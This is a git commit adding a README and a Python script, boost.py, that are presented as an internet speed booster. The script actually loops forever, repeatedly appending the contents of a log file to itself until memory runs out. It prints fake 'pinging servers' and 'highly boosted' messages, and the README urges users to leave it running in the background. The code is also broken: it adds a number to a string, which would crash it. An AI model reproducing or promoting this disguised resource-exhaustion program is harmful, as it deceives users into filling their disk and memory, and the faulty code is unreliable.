f8bd8f369234f9864ac6aacf5f7e2931b7a6724d
Busy Bee <pratiksmnth1234@gmail.com>
2020-08-13 23:00:11 +0530

    Initial Commit

---
+++ README.md
@@ -0,0 +1,12 @@
+This Programme is made to boost interrnet speed.
+
+Requirements:
+You seed to have python installed in your device
+
+Running the program:
+i) Go to the directory, open the Command line and type: "ls" for bash or "dir" for windows cli
+ii) If you find a file "named boost.py", type the command "py boost.py" (applicable to any cli)
+
+You can let it run it in the background and enjoy your network speed.
+
+Happy Surfing
---
+++ boost.py
@@ -0,0 +1,15 @@
+#####Python Programme To Boost Your Network Speed######
+myfile = open('Speed_Logs.txt', 'a+')
+myfile.write(".")
+text = ""
+print("We'll ping some servers to initiate the speed boost. This may take a few seconds.")
+a = True
+while a:
+    try:
+        print("Pinging Sites: " + len(text))
+        myfile.seek(len(text))
+        text = myfile.read()
+        myfile.write(text)
+    except MemoryError:
+        print("Your Divice Is Now Highly Boosted")
+        myfile.write(text)
